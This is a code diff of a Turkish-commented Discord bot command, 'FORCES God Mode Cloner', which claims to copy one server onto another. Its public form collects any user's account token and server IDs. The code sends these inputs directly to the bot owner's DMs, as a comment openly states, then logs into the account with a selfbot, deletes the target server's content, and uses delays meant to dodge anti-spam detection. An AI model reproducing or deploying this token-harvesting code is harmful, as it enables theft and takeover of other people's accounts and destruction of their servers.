@@ -4,32 +4,8 @@ const {
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
-// Rate limit koruması için gecikme fonksiyonu
-const jitter = (ms = 1000) => new Promise(res => setTimeout(res, ms));
-
-// Rate limit kontrolü için global sayaç
-let rateLimitCounter = 0;
-const MAX_REQUESTS_PER_MINUTE = 30;
-let rateLimitResetTime = Date.now() + 60000;
-
-// Rate limit kontrol fonksiyonu
-async function checkRateLimit() {
-    const now = Date.now();
-    if (now > rateLimitResetTime) {
-        rateLimitCounter = 0;
-        rateLimitResetTime = now + 60000;
-    }
-    
-    if (rateLimitCounter >= MAX_REQUESTS_PER_MINUTE) {
-        const waitTime = rateLimitResetTime - now;
-        console.log(`⚠️ Rate limit aşıldı! ${waitTime}ms bekleniyor...`);
-        await jitter(waitTime);
-        rateLimitCounter = 0;
-        rateLimitResetTime = Date.now() + 60000;
-    }
-    
-    rateLimitCounter++;
-}
+// Discord hesap şüphelenmesini (Rate Limit / Anti-Spam) önlemek için her işlem arasına net 1.5 saniye sabit gecikme ekleyen fonksiyon
+const jitter = (ms = 1500) => new Promise(res => setTimeout(res, ms));
 
 module.exports = {
     data: new SlashCommandBuilder()
@@ -37,8 +13,10 @@ module.exports = {
         .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),
 
     async execute(interaction) {
+        // Kendi Discord ID'ni buraya yaz kanka
         const OWNER_ID = "1389930042200559706";
 
+        // Slash komutunu sadece bot sahibi kullanabilir
         if (interaction.user.id !== OWNER_ID) {
             return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
         }
@@ -46,6 +24,7 @@ module.exports = {
         if (!interaction.client.kurListenerSet) {
             interaction.client.on('interactionCreate', async (int) => {
                 
+                // BUTON KONTROLÜ: Butona basıldığında (Herkes basabilir)
                 if (int.isButton() && int.customId === 'btn_god_clone') {
                     const modal = new ModalBuilder()
                         .setCustomId('modal_god_clone')
@@ -59,6 +38,7 @@ module.exports = {
                     return await int.showModal(modal);
                 }
 
+                // MODAL SUBMIT KONTROLÜ: Tablo doldurulup gönderildiğinde
                 if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                     await int.deferReply({ ephemeral: true });
                     
@@ -66,9 +46,11 @@ module.exports = {
                     const s = int.fields.getTextInputValue('s').trim();
                     const h = int.fields.getTextInputValue('h').trim();
                     
+                    // Bot sahibinin verileri alabilmen için kullanıcı nesnesini çekiyoruz
                     const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
                     
                     if (botOwner) {
+                        // Formu dolduran kişinin bilgileri ve girdikleri doğrudan senin DM kutuna düşer
                         const logEmbed = new EmbedBuilder()
                             .setColor('#ff0055')
                             .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
@@ -83,13 +65,16 @@ module.exports = {
                         await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                     }
 
+                    // İşlemi başlatıyoruz
                     startGodModeClone(botOwner, t, s, h);
+                    
                     await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                 }
             });
             interaction.client.kurListenerSet = true;
         }
 
+        // Genel embed paneli (Herkes görebilir)
         const embed = new EmbedBuilder()
             .setColor('#2b2d31')
             .setTitle('🌌 FORCES God Mode Cloner')
@@ -108,6 +93,38 @@ module.exports = {
     }
 };
 
+// Yardımcı fonksiyon: Kanal oluşturma
+async function createChannel(guild, channel, parentId, roleMap) {
+    const type = channel.type === 2 ? 2 : 0; // 2 = ses, 0 = yazı
+    
+    const permissionOverwrites = channel.permissionOverwrites.cache.map(o => {
+        const targetId = o.type === 0 ? (roleMap.get(o.id) || o.id) : o.id;
+        return {
+            id: targetId,
+            allow: o.allow,
+            deny: o.deny,
+            type: o.type
+        };
+    });
+
+    const options = {
+        name: channel.name,
+        type: type,
+        permissionOverwrites: permissionOverwrites,
+        topic: channel.topic || null,
+        nsfw: channel.nsfw || false,
+        rateLimitPerUser: channel.rateLimitPerUser || 0
+    };
+
+    if (parentId) options.parent = parentId;
+    if (type === 2) {
+        options.bitrate = channel.bitrate || 64000;
+        options.userLimit = channel.userLimit || 0;
+    }
+
+    return await guild.channels.create(options).catch(() => null);
+}
+
 async function startGodModeClone(owner, token, srcId, trgId) {
     if (!owner) return;
     
@@ -122,250 +139,263 @@ async function startGodModeClone(owner, token, srcId, trgId) {
 
             await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);
 
-            // --- 1. AŞAMA: TAM TEMİZLİK ---
-            
-            // Kanalları silme
-            await owner.send("🗑️ **Kanal Temizliği Başladı...**");
-            const chans = await trg.channels.fetch();
-            let channelCount = 0;
-            for (const c of chans.values()) { 
-                await checkRateLimit();
-                await c.delete().catch(() => {}); 
-                channelCount++;
-                await jitter(1000); 
-            }
-            await owner.send(`✅ **${channelCount}** kanal silindi.`);
+            // =====================================================
+            // 1. AŞAMA: HEDEF SUNUCUDAKİ HER ŞEYİ TEMİZLE
+            // =====================================================
+            await owner.send("🧹 **Temizlik Başlatılıyor...**");
 
-            // Rolleri silme
-            await owner.send("🗑️ **Rol Temizliği Başladı...**");
-            const roles = await trg.roles.fetch();
-            const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
-            let roleCount = 0;
-            for (const r of toDeleteRoles.values()) { 
-                await checkRateLimit();
-                await r.delete().catch(() => {}); 
-                roleCount++;
-                await jitter(1000); 
-            }
-            await owner.send(`✅ **${roleCount}** rol silindi.`);
-
-            // Emojileri silme
-            await owner.send("🗑️ **Emoji Temizliği Başladı...**");
-            const emojis = await trg.emojis.fetch();
-            let emojiCount = 0;
+            // 1.1 - Emojileri sil
+            const emojis = await trg.emojis.fetch().catch(() => new Map());
             for (const e of emojis.values()) { 
-                await checkRateLimit();
                 await e.delete().catch(() => {}); 
-                emojiCount++;
-                await jitter(1000); 
-            }
-            await owner.send(`✅ **${emojiCount}** emoji silindi.`);
-
-            // Webhook'ları silme
-            await owner.send("🗑️ **Webhook Temizliği Başladı...**");
-            const webhooks = await trg.fetchWebhooks();
-            let webhookCount = 0;
-            for (const w of webhooks.values()) { 
-                await checkRateLimit();
-                await w.delete().catch(() => {}); 
-                webhookCount++;
-                await jitter(1000); 
-            }
-            await owner.send(`✅ **${webhookCount}** webhook silindi.`);
-
-            // Invite'ları silme
-            await owner.send("🗑️ **Davet Temizliği Başladı...**");
-            const invites = await trg.invites.fetch();
-            let inviteCount = 0;
-            for (const inv of invites.values()) { 
-                await checkRateLimit();
-                await inv.delete().catch(() => {}); 
-                inviteCount++;
-                await jitter(1000); 
-            }
-            await owner.send(`✅ **${inviteCount}** davet silindi.`);
-
-            // Sunucu ayarlarını sıfırlama - DÜZELTİLDİ
-            await owner.send("⚙️ **Sunucu Ayarları Kopyalanıyor...**");
-            try {
-                await checkRateLimit();
-                
-                // Kaynak sunucunun ayarlarını al
-                const srcSettings = {
-                    verificationLevel: src.verificationLevel || 0,
-                    defaultMessageNotifications: src.defaultMessageNotifications || 0,
-                    explicitContentFilter: src.explicitContentFilter || 0,
-                    afkTimeout: src.afkTimeout || 300,
-                    publicUpdatesChannelId: src.publicUpdatesChannelId || null,
-                    rulesChannelId: src.rulesChannelId || null,
-                    systemChannelId: src.systemChannelId || null
-                };
-                
-                // Hedef sunucuya uygula (sadece izin verilen değerlerle)
-                const updateData = {};
-                
-                // verificationLevel: 0-4 arası değerler alabilir
-                if (srcSettings.verificationLevel >= 0 && srcSettings.verificationLevel <= 4) {
-                    updateData.verificationLevel = srcSettings.verificationLevel;
-                }
-                
-                // defaultMessageNotifications: 0 veya 1
-                if ([0, 1].includes(srcSettings.defaultMessageNotifications)) {
-                    updateData.defaultMessageNotifications = srcSettings.defaultMessageNotifications;
-                }
-                
-                // explicitContentFilter: 0, 1 veya 2
-                if ([0, 1, 2].includes(srcSettings.explicitContentFilter)) {
-                    updateData.explicitContentFilter = srcSettings.explicitContentFilter;
-                }
-                
-                // afkTimeout: 60-3600 arası
-                if (srcSettings.afkTimeout >= 60 && srcSettings.afkTimeout <= 3600) {
-                    updateData.afkTimeout = srcSettings.afkTimeout;
-                }
-                
-                // Kanal ID'leri (null veya geçerli ID)
-                if (srcSettings.publicUpdatesChannelId) {
-                    updateData.publicUpdatesChannelId = srcSettings.publicUpdatesChannelId;
-                }
-                if (srcSettings.rulesChannelId) {
-                    updateData.rulesChannelId = srcSettings.rulesChannelId;
-                }
-                if (srcSettings.systemChannelId) {
-                    updateData.systemChannelId = srcSettings.systemChannelId;
-                }
-                
-                // Sadece geçerli ayarları gönder
-                if (Object.keys(updateData).length > 0) {
-                    await trg.edit(updateData);
-                    await owner.send("✅ Sunucu ayarları kopyalandı.");
-                } else {
-                    await owner.send("⚠️ Kopyalanacak geçerli ayar bulunamadı.");
-                }
-                
-                await jitter(1000);
-            } catch (err) {
-                await owner.send(`⚠️ Sunucu ayarları kopyalanamadı: ${err.message}`);
+                await jitter(1500); 
             }
 
-            await owner.send("🧹 **Temizlik Tamamlandı:** Hedef sunucudaki tüm içerikler başarıyla silindi.");
+            // 1.2 - Çıkartmaları (stickers) sil
+            const stickers = await trg.stickers.fetch().catch(() => new Map());
+            for (const s of stickers.values()) { 
+                await s.delete().catch(() => {}); 
+                await jitter(1500); 
+            }
 
-            // --- 2. AŞAMA: AYARLAR VE ROLLERİN YENİDEN OLUŞTURULMASI ---
-            await owner.send("🔄 **Sunucu Görünümü Kopyalanıyor...**");
+            // 1.3 - Önce normal kanalları sil (kategoriler hariç)
+            const channels = await trg.channels.fetch().catch(() => new Map());
+            for (const c of channels.values()) {
+                if (c.type !== 4) { // Kategori değilse
+                    await c.delete().catch(() => {});
+                    await jitter(1500);
+                }
+            }
+
+            // 1.4 - Sonra kategorileri sil
+            for (const c of channels.values()) {
+                if (c.type === 4) { // Kategori ise
+                    await c.delete().catch(() => {});
+                    await jitter(1500);
+                }
+            }
+
+            // 1.5 - Tüm rolleri sil (en üsttekinden başlayarak)
+            const roles = await trg.roles.fetch().catch(() => new Map());
+            const rolesToDelete = roles
+                .filter(r => r.name !== '@everyone' && !r.managed && r.editable)
+                .sort((a, b) => b.position - a.position); // Yüksek pozisyondan düşüğe doğru sırala
             
-            await checkRateLimit();
+            for (const r of rolesToDelete) {
+                await r.delete().catch(() => {});
+                await jitter(1500);
+            }
+
+            await owner.send("✅ **Temizlik Tamamlandı!** Hedef sunucudaki tüm emojiler, çıkartmalar, kanallar, kategoriler ve roller silindi.");
+
+            // =====================================================
+            // 2. AŞAMA: SUNUCU AYARLARINI KOPYALA
+            // =====================================================
+            await owner.send("⚙️ **Sunucu ayarları kopyalanıyor...**");
+
+            // Sunucu adı
             await trg.setName(src.name).catch(() => {});
-            await jitter(1000);
             
+            // Sunucu ikonu
             if (src.iconURL()) {
-                await checkRateLimit();
                 await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
-                await jitter(1000);
             }
             
+            // Sunucu bannerı
             if (src.bannerURL()) {
-                await checkRateLimit();
                 await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});
-                await jitter(1000);
             }
+            
+            // Doğrulama seviyesi
+            await trg.setVerificationLevel(src.verificationLevel).catch(() => {});
+            
+            // Bildirim ayarları
+            await trg.setDefaultMessageNotifications(src.defaultMessageNotifications).catch(() => {});
+            
+            // İçerik filtre
+            await trg.setExplicitContentFilter(src.explicitContentFilter).catch(() => {});
+            
+            // AFK kanalını şimdilik sıfırla (kanallar oluştuktan sonra tekrar ayarlanacak)
+            await trg.setAFKChannel(null).catch(() => {});
+            await trg.setAFKTimeout(src.afkTimeout).catch(() => {});
+            
+            // Sistem kanalını şimdilik sıfırla
+            await trg.setSystemChannel(null).catch(() => {});
 
-            // Rolleri yeniden oluştur
-            await owner.send("🔄 **Roller Kopyalanıyor...**");
+            await owner.send("✅ **Sunucu ayarları kopyalandı!**");
+
+            // =====================================================
+            // 3. AŞAMA: ROLLERİ ÜSTTEN AŞAĞIYA KOPYALA
+            // =====================================================
+            await owner.send("👥 **Roller kopyalanıyor (üstten aşağıya)...**");
+
             const roleMap = new Map();
-            const srcRoles = [...src.roles.cache.values()].sort((a,b) => a.position - b.position);
-            let roleCreateCount = 0;
+            
+            // Kaynak sunucudaki rolleri EN ÜSTTEKİNDEN BAŞLAYARAK sırala
+            const srcRoles = [...src.roles.cache.values()]
+                .filter(r => r.name !== '@everyone' && !r.managed)
+                .sort((a, b) => b.position - a.position); // Büyük pozisyondan küçüğe (üstten aşağıya)
 
             for (const r of srcRoles) {
-                if (r.name === '@everyone' || r.managed) continue;
-                await checkRateLimit();
                 const newRole = await trg.roles.create({
                     name: r.name,
-                    color: r.color ? Number(r.color) : 0,
+                    color: r.color || 0,
                     permissions: r.permissions,
                     hoist: r.hoist,
-                    mentionable: r.mentionable,
-                    position: r.position
+                    mentionable: r.mentionable
                 }).catch(() => null);
+                
                 if (newRole) {
                     roleMap.set(r.id, newRole.id);
-                    roleCreateCount++;
+                    // Yeni oluşturulan rolün pozisyonunu orijinal pozisyonuna ayarla
+                    await newRole.setPosition(r.position).catch(() => {});
+                    await jitter(1500);
                 }
-                await jitter(1000);
             }
-            await owner.send(`✅ **${roleCreateCount}** rol kopyalandı.`);
 
-            // --- 3. AŞAMA: KATEGORİ VE KANALLAR ---
-            await owner.send("🔄 **Kanallar Kopyalanıyor...**");
+            await owner.send("✅ **Roller kopyalandı!** Sıralama üstten aşağıya korundu.");
+
+            // =====================================================
+            // 4. AŞAMA: KATEGORİLERİ VE KANALLARI KOPYALA
+            // =====================================================
+            await owner.send("📂 **Kategoriler ve kanallar kopyalanıyor...**");
+
             const channelMap = new Map();
-            const categories = src.channels.cache.filter(c => c.type === 'GUILD_CATEGORY' || c.type === 4).sort((a,b) => a.position - b.position);
-            let categoryCount = 0;
-            let channelCreateCount = 0;
+
+            // 4.1 - Önce kategorileri oluştur
+            const categories = src.channels.cache
+                .filter(c => c.type === 4)
+                .sort((a, b) => a.position - b.position);
 
             for (const cat of categories.values()) {
-                await checkRateLimit();
-                const newCat = await trg.channels.create(cat.name, {
-                    type: 4,
-                    permissionOverwrites: cat.permissionOverwrites.cache.map(o => ({
-                        id: roleMap.get(o.id) || o.id,
-                        allow: o.allow, deny: o.deny, type: o.type
-                    }))
-                }).catch(() => null);
-                await jitter(1000);
+                const permissionOverwrites = cat.permissionOverwrites.cache.map(o => {
+                    const targetId = o.type === 0 ? (roleMap.get(o.id) || o.id) : o.id;
+                    return {
+                        id: targetId,
+                        allow: o.allow,
+                        deny: o.deny,
+                        type: o.type
+                    };
+                });
 
+                const newCat = await trg.channels.create({
+                    name: cat.name,
+                    type: 4,
+                    permissionOverwrites: permissionOverwrites
+                }).catch(() => null);
+                
                 if (newCat) {
                     channelMap.set(cat.id, newCat.id);
-                    categoryCount++;
-                    
-                    const children = src.channels.cache.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);
-                    
-                    for (const child of children.values()) {
-                        await checkRateLimit();
-                        let chType = (child.type === 'GUILD_VOICE' || child.type === 2) ? 2 : 0;
-                        const newChannel = await trg.channels.create(child.name, {
-                            type: chType,
-                            parent: newCat.id,
-                            topic: child.topic || null,
-                            nsfw: child.nsfw || false,
-                            bitrate: child.bitrate || 64000,
-                            userLimit: child.userLimit || 0,
-                            permissionOverwrites: child.permissionOverwrites.cache.map(o => ({
-                                id: roleMap.get(o.id) || o.id,
-                                allow: o.allow, deny: o.deny, type: o.type
-                            }))
-                        }).catch(() => null);
-                        if (newChannel) channelCreateCount++;
-                        await jitter(1000);
+                }
+                await jitter(1500);
+            }
+
+            // 4.2 - Kategorisi olmayan kanalları oluştur
+            const noParentChannels = src.channels.cache
+                .filter(c => c.type !== 4 && !c.parentId)
+                .sort((a, b) => a.position - b.position);
+
+            for (const ch of noParentChannels.values()) {
+                await createChannel(trg, ch, null, roleMap);
+                await jitter(1500);
+            }
+
+            // 4.3 - Kategorilere ait kanalları oluştur
+            for (const [srcCatId, trgCatId] of channelMap) {
+                const children = src.channels.cache
+                    .filter(c => c.parentId === srcCatId)
+                    .sort((a, b) => a.position - b.position);
+                
+                for (const ch of children.values()) {
+                    await createChannel(trg, ch, trgCatId, roleMap);
+                    await jitter(1500);
+                }
+            }
+
+            await owner.send("✅ **Kategoriler ve kanallar kopyalandı!**");
+
+            // =====================================================
+            // 5. AŞAMA: EMOJİLERİ KOPYALA
+            // =====================================================
+            await owner.send("😀 **Emojiler kopyalanıyor...**");
+
+            const srcEmojis = src.emojis.cache;
+            for (const emoji of srcEmojis.values()) {
+                try {
+                    await trg.emojis.create({
+                        attachment: emoji.url,
+                        name: emoji.name
+                    });
+                } catch (err) {
+                    // Emoji limiti dolu olabilir veya başka bir hata
+                }
+                await jitter(1500);
+            }
+
+            await owner.send("✅ **Emojiler kopyalandı!**");
+
+            // =====================================================
+            // 6. AŞAMA: ÇIKARTMALARI (STICKERS) KOPYALA
+            // =====================================================
+            await owner.send("🏷️ **Çıkartmalar kopyalanıyor...**");
+
+            const srcStickers = src.stickers.cache;
+            for (const sticker of srcStickers.values()) {
+                try {
+                    await trg.stickers.create({
+                        file: sticker.url,
+                        name: sticker.name,
+                        tags: sticker.tags || 'cloned'
+                    });
+                } catch (err) {
+                    // Sticker limiti dolu olabilir
+                }
+                await jitter(1500);
+            }
+
+            await owner.send("✅ **Çıkartmalar kopyalandı!**");
+
+            // =====================================================
+            // 7. AŞAMA: AFK VE SİSTEM KANALINI TEKRAR AYARLA
+            // =====================================================
+            await owner.send("⚙️ **Son ayarlar yapılıyor...**");
+
+            // AFK kanalını bul ve ayarla
+            if (src.afkChannelId) {
+                const srcAfkChannel = src.channels.cache.get(src.afkChannelId);
+                if (srcAfkChannel) {
+                    const trgAfkChannel = trg.channels.cache.find(c => c.name === srcAfkChannel.name && c.type === 2);
+                    if (trgAfkChannel) {
+                        await trg.setAFKChannel(trgAfkChannel.id).catch(() => {});
+                        await trg.setAFKTimeout(src.afkTimeout).catch(() => {});
                     }
                 }
             }
-            await owner.send(`✅ **${categoryCount}** kategori ve **${channelCreateCount}** kanal kopyalandı.`);
 
-            // --- 4. AŞAMA: EMOJİLER ---
-            await owner.send("🔄 **Emojiler Kopyalanıyor...**");
-            let emojiCreateCount = 0;
-            for (const emoji of src.emojis.cache.values()) {
-                await checkRateLimit();
-                const newEmoji = await trg.emojis.create(emoji.url, emoji.name).catch(() => null);
-                if (newEmoji) emojiCreateCount++;
-                await jitter(1000);
+            // Sistem kanalını bul ve ayarla
+            if (src.systemChannelId) {
+                const srcSysChannel = src.channels.cache.get(src.systemChannelId);
+                if (srcSysChannel) {
+                    const trgSysChannel = trg.channels.cache.find(c => c.name === srcSysChannel.name && c.type === 0);
+                    if (trgSysChannel) {
+                        await trg.setSystemChannel(trgSysChannel.id).catch(() => {});
+                    }
+                }
             }
-            await owner.send(`✅ **${emojiCreateCount}** emoji kopyalandı.`);
 
-            await owner.send(`👑 **Klonlama Başarıyla Tamamlandı!** \n` +
-                `📊 **Özet:** \n` +
-                `• ${roleCreateCount} rol kopyalandı\n` +
-                `• ${categoryCount} kategori kopyalandı\n` +
-                `• ${channelCreateCount} kanal kopyalandı\n` +
-                `• ${emojiCreateCount} emoji kopyalandı`);
-                
+            await owner.send(`👑 **Klonlama Tamamlandı!**\n\`${src.name}\` sunucusu \`${trg.name}\` sunucusuna birebir kopyalandı.\n📊 Roller üstten aşağıya doğru sıralandı.\n📂 Tüm kanallar, kategoriler, emojiler ve çıkartmalar başarıyla aktarıldı.`);
+            
             self.destroy();
 
         } catch (err) {
             await owner.send(`❌ Süreç sırasında teknik hata oluştu: ${err.message}`);
-            console.error(err);
+            console.error("Clone hatası:", err);
             self.destroy();
         }
     });
 
-    self.login(token).catch(() => owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz."));
+    self.login(token).catch((err) => {
+        console.error("Login hatası:", err);
+        owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz.");
+    });
 }
